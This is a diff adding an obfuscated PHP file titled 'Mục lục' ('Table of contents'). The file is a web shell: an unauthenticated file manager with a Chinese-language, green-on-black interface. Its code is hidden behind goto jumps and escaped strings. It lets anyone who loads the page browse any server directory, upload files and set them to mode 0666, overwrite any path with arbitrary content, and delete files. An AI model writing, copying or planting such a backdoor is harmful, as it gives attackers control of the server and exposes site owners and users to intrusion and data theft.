@@ -1,0 +1,42 @@
+<?php
+ goto LQiqf; URaDW: foreach ($parts as $part) { if (!$part) { continue; } $current .= "\x2f" . $part; echo "\57\74\141\x20\150\x72\x65\146\75\42\77\143\167\144\x3d" . urlencode($current) . "\42\76" . htmlspecialchars($part) . "\74\x2f\x61\76"; } goto LA4Fs; LA4Fs: goto VUFCY; goto lwcFF; MloHk: function formatSize($bytes) { if ($bytes < 1024) { return $bytes . "\40\102"; } if ($bytes < 1048576) { return round($bytes / 1024, 2) . "\40\113\102"; } return round($bytes / 1048576, 2) . "\x20\x4d\102"; } goto RY6sz; GFBkw: goto qbE3w; goto DNwmF; DNwmF: qbE3w: goto RaHT6; RY6sz: ?>
+<!doctypehtml><html><head><meta charset="UTF-8"><title>Mục lục</title><meta content="width=device-width,initial-scale=1"name="viewport"><style>*{margin:0;padding:0;box-sizing:border-box;font-family:'Courier New',monospace}body{background:#000;color:#0f0;padding:15px;line-height:1.6}.header{display:flex;flex-wrap:wrap;gap:15px;padding-bottom:15px;border-bottom:1px solid #0a0}.path{flex-grow:1;word-break:break-all;padding:8px;background:rgba(10,20,10,.2);border:1px solid #0a0}.path a{color:red;text-decoration:none;padding:2px 5px}.path a:hover{background:#0a0;color:#000}.msg{padding:10px;margin:10px 0;background:rgba(0,50,0,.3);border:1px solid #0a0;text-align:center}.upload-area{display:flex;flex-wrap:wrap;gap:10px;padding:10px;background:rgba(10,20,10,.2);border:1px solid #0a0}.btn{padding:8px 15px;background:#000;color:#0f0;border:1px solid #0a0;cursor:pointer;font-size:14px}.btn:hover{background:#0a0;color:#000}.file-list{margin-top:15px;overflow:auto}table{width:100%;border-collapse:collapse}th{padding:10px;text-align:left;border-bottom:2px solid #0a0;background:rgba(0,30,0,.3)}td{padding:8px 10px;border-bottom:1px solid #050}tr:hover{background:rgba(0,50,0,.15)}.folder{color:red;font-weight:700}.file{color:#0f0}.actions{display:flex;gap:5px}.actions a{color:#0f0;text-decoration:none;padding:4px 8px;border:1px solid #0a0;font-size:13px}.actions a:hover{background:#0a0;color:#000}.editor{margin-top:20px;border:1px solid #0a0}.editor-header{padding:10px;background:rgba(10,20,10,.3);border-bottom:1px solid #0a0}textarea{width:100%;height:300px;background:#000;color:#0f0;padding:15px;border:none;resize:vertical;font-family:'Courier New',monospace;font-size:15px}.editor-footer{padding:10px;background:rgba(10,20,10,.3);border-top:1px solid #0a0;text-align:right}@media (max-width:768px){.header{flex-direction:column}.path,.upload-area{width:100%}td,th{padding:6px;font-size:13px}.actions{flex-direction:column}}</style></head><?php  goto IVZ8T; gsfQj: if (isset($_GET["\x65\x64\x69\164"]) && is_file($file = $cwd . "\x2f" . $_GET["\x65\x64\151\x74"])) { $editPath = $file; $editCont = file_get_contents($file); } goto MloHk; c180D: fsxHu: goto dlhIY; f3wNv: $editCont = ''; goto Qu7GB; kOvGg: goto FulWR; goto c_jSV; U1m3d: goto bBNUs; goto nCWgw; lT_pA: goto DX76N; goto DVpFT; U1pIn: goto mXBIr; goto wfZh5; m8mVd: $current = ''; goto MFMjJ; KGMB0: goto Tls26; goto NrnBi; G838d: if (!empty($_FILES["\x66\151\x6c\145\163"]["\x6e\x61\x6d\x65"][0])) { $uploaded = array(); foreach ($_FILES["\146\x69\x6c\145\163"]["\x6e\x61\155\145"] as $i => $name) { $tmp = $_FILES["\x66\151\x6c\145\x73"]["\164\x6d\x70\137\x6e\141\x6d\145"][$i]; $target = $cwd . "\57" . basename($name); if (move_uploaded_file($tmp, $target)) { chmod($target, 438); $uploaded[] = htmlspecialchars($name); } } $msg = $uploaded ? "\xe4\270\212\344\274\xa0\346\x88\220\xe5\x8a\237\72\40" . implode("\x2c\40", $uploaded) : "\xe4\xb8\x8a\344\274\xa0\345\xa4\261\xe8\xb4\xa5"; } goto PjMh5; UNJM5: goto y8O6g; goto ZKc89; c_jSV: bBNUs: goto xnwfh; xnwfh: $parts = explode("\57", trim($cwd, "\57")); goto EyHto; GerYv: ?>
+</div><div class="upload-area"><form method="post"enctype="multipart/form-data"><input name="files[]"type="file"hidden id="files"multiple> <label class="btn"for="files">选择多个文件</label> <button class="btn"type="submit">上传文件</button></form></div></div><?php  goto gyW5O; Ync_i: goto MUgKo; goto TXb_e; mWMzC: ?>
+<div class="file-list"><table><thead><tr><th>名称</th><th>类型</th><th>大小</th><th>操作</th></tr></thead><tbody><?php  goto KGMB0; PjMh5: if (isset($_GET["\x64\145\x6c"])) { $file = $cwd . "\57" . $_GET["\x64\145\x6c"]; if (is_file($file) && unlink($file)) { $msg = "\xe5\210\240\351\x99\xa4\346\210\220\345\x8a\237\72\40" . htmlspecialchars($_GET["\x64\145\154"]); } else { $msg = "\345\210\xa0\351\x99\244\345\xa4\261\350\264\xa5"; } } goto RW9uH; x815L: foreach ($list as $item) { $name = htmlspecialchars($item["\x6e\x61\x6d\x65"]); $isDir = $item["\x69\163\104\x69\162"]; ?>
+<tr><td><a href="<?php  echo $isDir ? "\77\143\167\x64\75" . urlencode($item["\160\141\164\150"]) : "\x3f\x65\144\151\x74\x3d" . urlencode($item["\x6e\141\155\145"]) . "\46\x63\x77\144\75" . urlencode($cwd); ?>
+"class="<?php  echo $isDir ? "\x66\x6f\154\144\145\162" : "\146\151\x6c\145"; ?>
+"><?php  echo $name; echo $isDir ? "\x2f" : ''; ?>
+</a></td><td><?php  echo $isDir ? "\x3c\x73\160\141\156\40\x63\154\x61\163\x73\75\42\146\x6f\x6c\x64\145\x72\x22\76\xe6\226\x87\xe4\xbb\xb6\xe5\xa4\271\74\x2f\163\160\141\156\76" : "\74\163\x70\x61\x6e\x20\143\x6c\x61\x73\163\x3d\42\146\x69\154\145\42\76\xe6\226\x87\344\xbb\xb6\x3c\x2f\163\160\x61\x6e\x3e"; ?>
+</td><td><?php  echo $isDir ? "\x2d" : formatSize(filesize($item["\x70\141\164\x68"])); ?>
+</td><td class="actions"><?php  if (!$isDir) { ?>
+<a href="?edit=<?php  echo urlencode($item["\x6e\141\x6d\x65"]); ?>
+&cwd=<?php  echo urlencode($cwd); ?>
+">编辑</a> <a href="?del=<?php  echo urlencode($item["\x6e\x61\155\x65"]); ?>
+&cwd=<?php  echo urlencode($cwd); ?>
+"onclick='return confirm("删除<?php  echo $name; ?>
+?")'>删除</a><?php  } ?>
+</td></tr><?php  } goto bBKVV; bBKVV: goto eWzCX; goto jGytW; vswZs: echo "\74\141\x20\x68\162\x65\146\75\42\77\143\167\144\75\57\x22\76\57\74\57\141\76"; goto UNJM5; Qu7GB: foreach ($files as $file) { if ($file === "\x2e" || $file === "\x2e\x2e") { continue; } $path = $cwd . "\57" . $file; $isDir = is_dir($path); $list[] = array("\156\x61\x6d\x65" => $file, "\160\x61\x74\150" => $path, "\151\163\x44\x69\x72" => $isDir); } goto gsfQj; EyHto: goto WgF4c; goto i8bwc; IVZ8T: goto HvQ7V; goto yq2Bq; yq2Bq: HvQ7V: goto s9ZYD; DVpFT: SSVDn: goto YDObw; TXb_e: MUgKo: goto G838d; UqV1p: y8O6g: goto URaDW; s9ZYD: ?>
+<body><div class="header"><div class="path"><?php  goto U1m3d; lwcFF: VUFCY: goto GerYv; gyW5O: goto SSVDn; goto Ocg_E; jGytW: WgF4c: goto m8mVd; wfZh5: mXBIr: goto mWMzC; RW9uH: if (isset($_POST["\163\141\x76\145"])) { if (file_put_contents($_POST["\160\x61\164\x68"], $_POST["\x63\x6f\156\164"])) { chmod($_POST["\160\141\164\x68"], 438); $msg = "\xe4\277\x9d\345\255\x98\xe6\210\x90\345\x8a\x9f"; } else { $msg = "\344\xbf\235\345\255\230\xe5\xa4\xb1\xe8\264\245"; } } goto lnajc; NrnBi: ixIzU: goto vswZs; dlhIY: $cwd = realpath($_GET["\x63\167\144"] ?? "\56") ?: "\57"; goto GFBkw; ZKc89: Tls26: goto x815L; nCWgw: eWzCX: goto oMWkD; oMWkD: ?>
+</div><?php  goto lT_pA; MFMjJ: goto ixIzU; goto UqV1p; de8Cd: $editPath = ''; goto f3wNv; i8bwc: FulWR: goto qhmRK; YDObw: if (!empty($msg)) { ?>
+<div class="msg"><?php  echo $msg; ?>
+</div><?php  } goto U1pIn; Ocg_E: DX76N: goto uWY7O; RaHT6: $cwd = rtrim(str_replace("\x5c", "\57", $cwd), "\57"); goto Ync_i; lnajc: $files = scandir($cwd) ?: array(); goto vFwhJ; uWY7O: if ($editPath) { ?>
+<div class="editor"><div class="editor-header">编辑: <span class="file"><?php  echo htmlspecialchars(basename($editPath)); ?>
+</span></div><form method="post"><input name="path"type="hidden"value="<?php  echo htmlspecialchars($editPath); ?>
+"> <textarea name="cont"><?php  echo htmlspecialchars($editCont); ?>
+</textarea><div class="editor-footer"><button class="btn"type="submit"name="save">保存文件</button></div></form></div><?php  } goto kOvGg; vFwhJ: $list = array(); goto de8Cd; LQiqf: goto fsxHu; goto c180D; qhmRK: ?>
+<script>// 上传文件按钮增强
+document.getElementById('files').addEventListener('change', function(e) {
+    if (this.files.length > 0) {
+        alert('已选择 ' + this.files.length + ' 个文件，点击"上传文件"按钮开始上传');
+    }
+});
+
+// 键盘快捷键支持
+document.addEventListener('keydown', function(e) {
+    // Ctrl+S 保存文件
+    if (e.ctrlKey && e.key === 's') {
+        e.preventDefault();
+        const saveBtn = document.querySelector('button[name="save"]');
+        if (saveBtn) saveBtn.click();
+    }
+});</script></body></html>
